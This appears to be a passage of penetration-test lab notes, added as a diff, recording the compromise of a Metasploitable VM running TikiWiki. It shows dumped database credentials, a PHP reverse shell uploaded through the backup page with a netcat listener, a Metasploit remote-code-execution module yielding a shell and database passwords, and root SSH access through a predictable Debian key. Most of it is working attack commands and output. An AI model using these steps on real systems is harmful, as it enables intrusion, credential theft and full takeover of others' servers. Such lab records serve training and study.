+| tiki_page_footnotes                |
+| tiki_pages                         |
+| tiki_pageviews                     |
+| tiki_poll_objects                  |
+| tiki_poll_options                  |
+| tiki_polls                         |
+| tiki_preferences                   |
+| tiki_private_messages              |
+| tiki_programmed_content            |
+| tiki_quicktags                     |
+| tiki_quiz_question_options         |
+| tiki_quiz_questions                |
+| tiki_quiz_results                  |
+| tiki_quiz_stats                    |
+| tiki_quiz_stats_sum                |
+| tiki_quizzes                       |
+| tiki_received_articles             |
+| tiki_received_pages                |
+| tiki_referer_stats                 |
+| tiki_related_categories            |
+| tiki_rss_feeds                     |
+| tiki_rss_modules                   |
+| tiki_score                         |
+| tiki_search_stats                  |
+| tiki_searchindex                   |
+| tiki_searchsyllable                |
+| tiki_searchwords                   |
+| tiki_secdb                         |
+| tiki_semaphores                    |
+| tiki_sent_newsletters              |
+| tiki_sessions                      |
+| tiki_sheet_layout                  |
+| tiki_sheet_values                  |
+| tiki_sheets                        |
+| tiki_shoutbox                      |
+| tiki_shoutbox_words                |
+| tiki_stats                         |
+| tiki_structure_versions            |
+| tiki_structures                    |
+| tiki_submissions                   |
+| tiki_suggested_faq_questions       |
+| tiki_survey_question_options       |
+| tiki_survey_questions              |
+| tiki_surveys                       |
+| tiki_tags                          |
+| tiki_theme_control_categs          |
+| tiki_theme_control_objects         |
+| tiki_theme_control_sections        |
+| tiki_topics                        |
+| tiki_tracker_fields                |
+| tiki_tracker_item_attachments      |
+| tiki_tracker_item_comments         |
+| tiki_tracker_item_fields           |
+| tiki_tracker_items                 |
+| tiki_tracker_options               |
+| tiki_trackers                      |
+| tiki_translated_objects            |
+| tiki_untranslated                  |
+| tiki_user_answers                  |
+| tiki_user_answers_uploads          |
+| tiki_user_assigned_modules         |
+| tiki_user_bookmarks_folders        |
+| tiki_user_bookmarks_urls           |
+| tiki_user_mail_accounts            |
+| tiki_user_menus                    |
+| tiki_user_modules                  |
+| tiki_user_notes                    |
+| tiki_user_postings                 |
+| tiki_user_preferences              |
+| tiki_user_quizzes                  |
+| tiki_user_taken_quizzes            |
+| tiki_user_tasks                    |
+| tiki_user_tasks_history            |
+| tiki_user_votings                  |
+| tiki_user_watches                  |
+| tiki_userfiles                     |
+| tiki_userpoints                    |
+| tiki_users                         |
+| tiki_users_score                   |
+| tiki_webmail_contacts              |
+| tiki_webmail_messages              |
+| tiki_wiki_attachments              |
+| tiki_zones                         |
+| users_grouppermissions             |
+| users_groups                       |
+| users_objectpermissions            |
+| users_permissions                  |
+| users_usergroups                   |
+| users_users                        |
++------------------------------------+
+194 rows in set (0.00 sec)
+
+mysql> select * from users_users;
++--------+-------+-------+----------+----------+---------------+------------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+
+| userId | email | login | password | provpass | default_group | lastLogin  | currentLogin | registrationDate | challenge | pass_due | hash                             | created | avatarName | avatarSize | avatarFileType | avatarData | avatarLibName | avatarType | score |
++--------+-------+-------+----------+----------+---------------+------------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+
+|      1 |       | admin | admin    | NULL     | NULL          | 1271712540 |   1271712540 |             NULL | NULL      |     NULL | f6fdffe48c908deb0f4c3bd36c032e72 |    NULL | NULL       |       NULL | NULL           | NULL       | NULL          | NULL       |     0 |
++--------+-------+-------+----------+----------+---------------+------------+--------------+------------------+-----------+----------+----------------------------------+---------+------------+------------+----------------+------------+---------------+------------+-------+
+1 row in set (0.00 sec)
+
+mysql> select login, password from users_users;
++-------+----------+
+| login | password |
++-------+----------+
+| admin | admin    |
++-------+----------+
+1 row in set (0.01 sec)
+
+mysql> 
+
+In Browser
+http://192.168.174.130/tikiwiki/tiki-listpages.php?offset=0&sort_mode=
+Username -> admin
+Password -> admin
+
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+Line 49 -> $ip = '192.168.174.137';  // CHANGE THIS
+
+root@kali:~# ifconfig 
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:eb:8b:2a  
+          inet addr:192.168.174.137  Bcast:192.168.174.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:feeb:8b2a/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:259320 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:310571 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:64080031 (61.1 MiB)  TX bytes:31769278 (30.2 MiB)
+          Interrupt:19 Base address:0x2000 
+          
+root@kali:~#
+
+http://192.168.174.130/tikiwiki/tiki-backup.php
+Upload the shell
+
+Set up a listener
+root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+
+http://192.168.174.130/tikiwiki/backups/shell.php
+
+Listener
+root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+192.168.174.130: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.174.137] from (UNKNOWN) [192.168.174.130] 36109
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+ 23:31:27 up  2:05,  0 users,  load average: 0.00, 0.02, 1.17
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname
+metasploitable
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+$ 
+
+In msf
+msf > search tikiwiki
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                             Disclosure Date  Rank       Description
+   ----                                             ---------------  ----       -----------
+   auxiliary/admin/tikiwiki/tikidblib               2006-11-01       normal     TikiWiki Information Disclosure
+   exploit/unix/webapp/php_xmlrpc_eval              2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution
+   exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  TikiWiki tiki-graph_formula Remote PHP Code Execution
+   exploit/unix/webapp/tikiwiki_jhot_exec           2006-09-02       excellent  TikiWiki jhot Remote Command Execution
+   exploit/unix/webapp/tikiwiki_unserialize_exec    2012-07-04       excellent  Tiki Wiki unserialize() PHP Code Execution
+
+
+msf > use exploit/unix/webapp/tikiwiki_graph_formula_exec
+msf exploit(tikiwiki_graph_formula_exec) > show options 
+
+Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST                     yes       The target address
+   RPORT    80               yes       The target port
+   URI      /tikiwiki        yes       TikiWiki directory path
+   VHOST                     no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf exploit(tikiwiki_graph_formula_exec) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                           Disclosure Date  Rank    Description
+   ----                           ---------------  ----    -----------
+   generic/custom                                  normal  Custom Payload
+   generic/shell_bind_tcp                          normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                       normal  Generic Command Shell, Reverse TCP Inline
+   php/bind_perl                                   normal  PHP Command Shell, Bind TCP (via Perl)
+   php/bind_perl_ipv6                              normal  PHP Command Shell, Bind TCP (via perl) IPv6
+   php/bind_php                                    normal  PHP Command Shell, Bind TCP (via PHP)
+   php/bind_php_ipv6                               normal  PHP Command Shell, Bind TCP (via php) IPv6
+   php/download_exec                               normal  PHP Executable Download and Execute
+   php/exec                                        normal  PHP Execute Command 
+   php/meterpreter/bind_tcp                        normal  PHP Meterpreter, Bind TCP Stager
+   php/meterpreter/bind_tcp_ipv6                   normal  PHP Meterpreter, Bind TCP Stager IPv6
+   php/meterpreter/reverse_tcp                     normal  PHP Meterpreter, PHP Reverse TCP Stager
+   php/reverse_perl                                normal  PHP Command, Double Reverse TCP Connection (via Perl)
+   php/reverse_php                                 normal  PHP Command Shell, Reverse TCP (via PHP)
+
+msf exploit(tikiwiki_graph_formula_exec) > set payload generic/shell_bind_tcp
+payload => generic/shell_bind_tcp
+msf exploit(tikiwiki_graph_formula_exec) > show options 
+
+Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST    192.168.174.130  yes       The target address
+   RPORT    80               yes       The target port
+   URI      /tikiwiki        yes       TikiWiki directory path
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (generic/shell_bind_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST  192.168.174.130  no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(tikiwiki_graph_formula_exec) > exploit 
+
+[*] Attempting to obtain database credentials...
+[*] Started bind handler
+[*] The server returned            : 200 OK
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] TikiWiki database informations : 
+
+db_tiki   : mysql
+dbversion : 1.9
+host_tiki : localhost
+user_tiki : root
+pass_tiki : root
+dbs_tiki  : tikiwiki195
+
+[*] Attempting to execute our payload...
+[*] Command shell session 1 opened (192.168.174.137:33320 -> 192.168.174.130:4444) at 2016-01-23 23:38:03 -0500
+
+ls
+INSTALL
+README
+_htaccess
+about.php
+article_image.php
+backups
+banner_click.php
+banner_image.php
+categorize.php
+categorize_list.php
+changelog.txt
+comments.php
+commxmlrpc.php
+copyright.txt
+copyrights.php
+db
+display_banner.php
+doc
+dump
+favicon.png
+files
+fixperms.sh
+function.js_maxlength.php
+games
+get_strings.php
+green.favicon.png
+help.php
+htaccess.sh
+images
+img
+index.php
+jhot.php
+lang
+lib
+license.txt
+maps
+messu-archive.php
+messu-broadcast.php
+messu-compose.php
+messu-mailbox.php
+messu-read.php
+messu-read_archive.php
+messu-read_sent.php
+messu-sent.php
+mods
+modules
+parse_tiki.php
+poll_categorize.php
+popups
+received_article_image.php
+remote.php
+robots.txt
+select_banner.php
+setup.sh
+setup_smarty.php
+show_image.php
+styles
+temp
+templates
+templates_c
+textareasize.php
+tiki-admin.php
+tiki-admin_banning.php
+tiki-admin_calendars.php
+tiki-admin_categories.php
+tiki-admin_chart_items.php
+tiki-admin_charts.php
+tiki-admin_chat.php
+tiki-admin_content_templates.php
+tiki-admin_cookies.php
+tiki-admin_drawings.php
+tiki-admin_dsn.php
+tiki-admin_external_wikis.php
+tiki-admin_forums.php
+tiki-admin_hotwords.php
+tiki-admin_html_page_content.php
+tiki-admin_html_pages.php
+tiki-admin_include_blogs.php
+tiki-admin_include_calendar.php
+tiki-admin_include_cms.php
+tiki-admin_include_community.php
+tiki-admin_include_directory.php
+tiki-admin_include_faqs.php
+tiki-admin_include_features.php
+tiki-admin_include_fgal.php
+tiki-admin_include_forums.php
+tiki-admin_include_gal.php
+tiki-admin_include_general.php
+tiki-admin_include_gmap.php
+tiki-admin_include_i18n.php
+tiki-admin_include_intertiki.php
+tiki-admin_include_login.php
+tiki-admin_include_maps.php
+tiki-admin_include_metatags.php
+tiki-admin_include_polls.php
+tiki-admin_include_rss.php
+tiki-admin_include_score.php
+tiki-admin_include_search.php
+tiki-admin_include_siteid.php
+tiki-admin_include_trackers.php
+tiki-admin_include_userfiles.php
+tiki-admin_include_webmail.php
+tiki-admin_include_wiki.php
+tiki-admin_include_wikiatt.php
+tiki-admin_integrator.php
+tiki-admin_integrator_rules.php
+tiki-admin_layout.php
+tiki-admin_links.php
+tiki-admin_mailin.php
+tiki-admin_menu_options.php
+tiki-admin_menus.php
+tiki-admin_modules.php
+tiki-admin_newsletter_subscriptions.php
+tiki-admin_newsletters.php
+tiki-admin_notifications.php
+tiki-admin_poll_options.php
+tiki-admin_polls.php
+tiki-admin_quicktags.php
+tiki-admin_rssmodules.php
+tiki-admin_score.php
+tiki-admin_security.php
+tiki-admin_shoutbox_words.php
+tiki-admin_structures.php
+tiki-admin_survey_questions.php
+tiki-admin_surveys.php
+tiki-admin_system.php
+tiki-admin_topics.php
+tiki-admin_tracker_fields.php
+tiki-admin_trackers.php
+tiki-admingroups.php
+tiki-adminusers.php
+tiki-article_types.php
+tiki-articles_rss.php
+tiki-assignpermission.php
+tiki-assignuser.php
+tiki-backlinks.php
+tiki-backup.php
+tiki-batch_upload.php
+tiki-blog_post.php
+tiki-blog_rankings.php
+tiki-blog_rss.php
+tiki-blogs_rss.php
+tiki-browse_categories.php
+tiki-browse_gallery.php
+tiki-browse_image.php
+tiki-calendar.php
+tiki-calendar_import.php
+tiki-calendars_rss.php
+tiki-categpermissions.php
+tiki-change_password.php
+tiki-charts.php
+tiki-chat.php
+tiki-chat_box.php
+tiki-chat_center.html
+tiki-chat_loader.php
+tiki-chat_users.php
+tiki-chatroom.php
+tiki-cms_rankings.php
+tiki-config_pdf.php
+tiki-contact.php
+tiki-cookie-jar.php
+tiki-create_webhelp.php
+tiki-custom_home.php
+tiki-debug_console.php
+tiki-directories_rss.php
+tiki-directory_add_site.php
+tiki-directory_add_tiki_site.php
+tiki-directory_admin.php
+tiki-directory_admin_categories.php
+tiki-directory_admin_related.php
+tiki-directory_admin_sites.php
+tiki-directory_browse.php
+tiki-directory_ranking.php
+tiki-directory_redirect.php
+tiki-directory_rss.php
+tiki-directory_search.php
+tiki-directory_validate_sites.php
+tiki-download_file.php
+tiki-download_forum_attachment.php
+tiki-download_item_attachment.php
+tiki-download_userfile.php
+tiki-download_wiki_attachment.php
+tiki-edit_article.php
+tiki-edit_banner.php
+tiki-edit_blog.php
+tiki-edit_css.php
+tiki-edit_image.php
+tiki-edit_languages.php
+tiki-edit_programmed_content.php
+tiki-edit_question_options.php
+tiki-edit_quiz.php
+tiki-edit_quiz_questions.php
+tiki-edit_quiz_results.php
+tiki-edit_structure.php
+tiki-edit_submission.php
+tiki-edit_templates.php
+tiki-edit_topic.php
+tiki-edit_translation.php
+tiki-editdrawing.php
+tiki-editpage.php
+tiki-eph.php
+tiki-eph_admin.php
+tiki-error.php
+tiki-error_simple.php
+tiki-export_pdf.php
+tiki-export_sheet.php
+tiki-export_tracker.php
+tiki-export_wiki_pages.php
+tiki-faq_questions.php
+tiki-featured_link.php
+tiki-file_galleries.php
+tiki-file_galleries_rankings.php
+tiki-file_galleries_rss.php
+tiki-file_gallery_rss.php
+tiki-forum_queue.php
+tiki-forum_rankings.php
+tiki-forum_rss.php
+tiki-forums.php
+tiki-forums_reported.php
+tiki-forums_rss.php
+tiki-friends.php
+tiki-g-admin_activities.php
+tiki-g-admin_graph.php
+tiki-g-admin_instance.php
+tiki-g-admin_instance_activity.php
+tiki-g-admin_processes.php
+tiki-g-admin_roles.php
+tiki-g-admin_shared_source.php
+tiki-g-monitor_activities.php
+tiki-g-monitor_instances.php
+tiki-g-monitor_processes.php
+tiki-g-monitor_workitems.php
+tiki-g-my_activities.php
+tiki-g-my_instances.php
+tiki-g-run_activity.php
+tiki-g-save_process.php
+tiki-g-user_activities.php
+tiki-g-user_instances.php
+tiki-g-user_processes.php
+tiki-g-view_comment.php
+tiki-g-view_workitem.php
+tiki-galleries.php
+tiki-galleries_rankings.php
+tiki-gmap_locator.php
+tiki-gmap_usermap.php
+tiki-graph_formula.php
+tiki-graph_sheet.php
+tiki-handlers.php
+tiki-history_sheets.php
+tiki-image_galleries_rss.php
+tiki-image_gallery_rss.php
+tiki-imexport_languages.php
+tiki-import_sheet.php
+tiki-import_structuredtext.php
+tiki-import_tracker.php
+tiki-index.php
+tiki-index_p.php
+tiki-index_raw.php
+tiki-install.php
+tiki-integrator.php
+tiki-jscalendar.php
+tiki-lastchanges.php
+tiki-layout_options.php
+tiki-likepages.php
+tiki-list_articles.php
+tiki-list_banners.php
+tiki-list_blogs.php
+tiki-list_cache.php
+tiki-list_contents.php
+tiki-list_faqs.php
+tiki-list_file_gallery.php
+tiki-list_gallery.php
+tiki-list_games.php
+tiki-list_integrator_repositories.php
+tiki-list_posts.php
+tiki-list_quizzes.php
+tiki-list_submissions.php
+tiki-list_surveys.php
+tiki-list_trackers.php
+tiki-list_users.php
+tiki-listmovies.php
+tiki-listpages.php
+tiki-live_support_admin.php
+tiki-live_support_chat_frame.php
+tiki-live_support_chat_window.php
+tiki-live_support_client.php
+tiki-live_support_console.php
+tiki-live_support_message.php
+tiki-live_support_server.php
+tiki-live_support_transcripts.php
+tiki-login.php
+tiki-login_scr.php
+tiki-login_validate.php
+tiki-logout.php
+tiki-mailin-code.php
+tiki-mailin.php
+tiki-map.phtml
+tiki-map_download.phtml
+tiki-map_edit.php
+tiki-map_history.php
+tiki-map_rss.php
+tiki-map_upload.php
+tiki-minical.php
+tiki-minical_export.php
+tiki-minical_prefs.php
+tiki-minical_reminders.php
+tiki-mobile.php
+tiki-mods.php
+tiki-mods_admin.php
+tiki-module_controls.php
+tiki-modules.php
+tiki-my_tiki.php
+tiki-mytiki_shared.php
+tiki-newsletter_archives.php
+tiki-newsletters.php
+tiki-newsreader_groups.php
+tiki-newsreader_news.php
+tiki-newsreader_read.php
+tiki-newsreader_servers.php
+tiki-notepad_get.php
+tiki-notepad_list.php
+tiki-notepad_read.php
+tiki-notepad_write.php
+tiki-objectpermissions.php
+tiki-old_polls.php
+tiki-orphan_pages.php
+tiki-page.php
+tiki-page_loader.php
+tiki-pagehistory.php
+tiki-pagepermissions.php
+tiki-pagesetup.php
+tiki-pagination.php
+tiki-pdf.php
+tiki-phpinfo.php
+tiki-pick_avatar.php
+tiki-poll_form.php
+tiki-poll_results.php
+tiki-print.php
+tiki-print_article.php
+tiki-print_blog_post.php
+tiki-print_multi_pages.php
+tiki-print_pages.php
+tiki-pv_chart.php
+tiki-quiz_download_answer.php
+tiki-quiz_edit.php
+tiki-quiz_result_stats.php
+tiki-quiz_stats.php
+tiki-quiz_stats_quiz.php
+tiki-random_num_img.php
+tiki-read_article.php
+tiki-received_articles.php
+tiki-received_pages.php
+tiki-referer_stats.php
+tiki-register.php
+tiki-register_site.php
+tiki-remind_password.php
+tiki-remote_backup.php
+tiki-removepage.php
+tiki-rename_page.php
+tiki-replicate.php
+tiki-replicate_console.php
+tiki-rollback.php
+tiki-rss_error.php
+tiki-search_stats.php
+tiki-searchindex.php
+tiki-searchresults.php
+tiki-section_options.php
+tiki-send_blog_post.php
+tiki-send_newsletters.php
+tiki-send_objects.php
+tiki-setup.php
+tiki-setup_base.php
+tiki-sheets.php
+tiki-shoutbox.php
+tiki-show_raw_links.php
+tiki-show_user_avatar.php
+tiki-slideshow.php
+tiki-slideshow2.php
+tiki-special_chars.php
+tiki-stats.php
+tiki-survey_stats.php
+tiki-survey_stats_survey.php
+tiki-switch_lang.php
+tiki-switch_theme.php
+tiki-syslog.php
+tiki-take_quiz.php
+tiki-take_survey.php
+tiki-tc.php
+tiki-theme_control.php
+tiki-theme_control_objects.php
+tiki-theme_control_sections.php
+tiki-tracker_rss.php
+tiki-upload_file.php
+tiki-upload_image.php
+tiki-usage_chart.php
+tiki-user_assigned_modules.php
+tiki-user_bookmarks.php
+tiki-user_cached_bookmark.php
+tiki-user_information.php
+tiki-user_preferences.php
+tiki-user_tasks.php
+tiki-user_watches.php
+tiki-userfiles.php
+tiki-usermenu.php
+tiki-userversions.php
+tiki-view_articles.php
+tiki-view_banner.php
+tiki-view_blog.php
+tiki-view_blog_post.php
+tiki-view_blog_post_image.php
+tiki-view_cache.php
+tiki-view_chart.php
+tiki-view_chart_item.php
+tiki-view_eph.php
+tiki-view_faq.php
+tiki-view_forum.php
+tiki-view_forum_thread.php
+tiki-view_irc.php
+tiki-view_minical_topic.php
+tiki-view_sheets.php
+tiki-view_tracker.php
+tiki-view_tracker_item.php
+tiki-view_tracker_more_info.php
+tiki-wap.php
+tiki-webmail.php
+tiki-webmail_contacts.php
+tiki-webmail_download_attachment.php
+tiki-wiki3d.php
+tiki-wiki3d_xmlrpc.php
+tiki-wiki_rankings.php
+tiki-wiki_rss.php
+tiki-xmlrpc_services.php
+tikimovies
+topic_image.php
+whelp
+xmlrpc.php
+whoami
+www-data
+hostname
+metasploitable
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+ls -lah /root
+total 32K
+drwxr-xr-x  3 root root 4.0K May 17  2010 .
+drwxr-xr-x 21 root root 4.0K Apr 28  2010 ..
+-rw-------  1 root root   47 Jan 23 21:37 .bash_history
+-rw-r--r--  1 root root 2.2K Oct 20  2007 .bashrc
+-rw-------  1 root root  187 Apr 28  2010 .lesshst
+-rw-r--r--  1 root root  141 Oct 20  2007 .profile
+drwxr-xr-x  2 root root 4.0K May 17  2010 .ssh
+-rwx------  1 root root  401 Apr 28  2010 reset_logs.sh
+ls -lah /root/.ssh
+total 12K
+drwxr-xr-x 2 root root 4.0K May 17  2010 .
+drwxr-xr-x 3 root root 4.0K May 17  2010 ..
+-rw-r--r-- 1 root root  405 May 17  2010 authorized_keys
+cat /root/.ssh/authorized_keys        
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+
+In Browser
+https://www.exploit-db.com/exploits/5622/
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2
+
+In Kali
+root@kali:~/Desktop# tar xvjf 5622.tar.bz2 
+rsa/
+rsa/2048/
+rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
+rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
+rsa/2048/0bdcea11b2c628c7fd8bc4b04ca43668-12474
+rsa/2048/3fabfedd883c3cef69881a4fc30fdac7-3828.pub
+rsa/2048/a508919ec49fcf91ad0ecf8472349d9b-3039.pub
+rsa/2048/9ddc1879b9ac311f24a81e835aac5866-28340.pub
+rsa/2048/37cb6c02b84dfab70b7e0ad014a00414-27656.pub
+rsa/2048/17b33876782270d00f0aa284757e82ba-15477.pub
+rsa/2048/be74666ad474495ab736fc3202477d84-6942
+<--- snip --->
+rsa/2048/2df5993a79670bfbf518ccbe1c880698-6057
+rsa/2048/22395760ea6265919ef5db8d26dda56c-17578
+rsa/2048/e311fc52da0d062cd6e9a507a7470db8-15835.pub
+rsa/2048/ae88b6e25a832541ac60978e90fb40fe-28014
+rsa/2048/759ee1c853d2fcc07a13e6867ed75a35-26843
+rsa/2048/22817b9fcfca9c043d6d48dac528b0a6-3298
+rsa/2048/cd84c0196af31046b45037f39208c9c1-11710
+rsa/2048/9634a42c34d72e776593a9f1ddd38085-2633
+rsa/2048/1668b5d4171480a6359c0966ded47550-15730
+rsa/2048/b8a7774ef9e5b9b2b73a685e509b899b-2131
+root@kali:~/Desktop# 
+root@kali:~/Desktop/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
+57c3115d77c56390332dc5c49978627a-5429.pub
+root@kali:~/Desktop/rsa/2048#
+
+SSH
+root@kali:~/Desktop/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.174.130
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have mail.
+root@metasploitable:~# whoami
+root
+root@metasploitable:~# hostname
+metasploitable
+root@metasploitable:~# ifconfig 
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:6e:13:ca  
+          inet addr:192.168.174.130  Bcast:192.168.174.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe6e:13ca/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:49197 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1168 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:2965439 (2.8 MB)  TX bytes:79255 (77.3 KB)
+          Interrupt:17 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
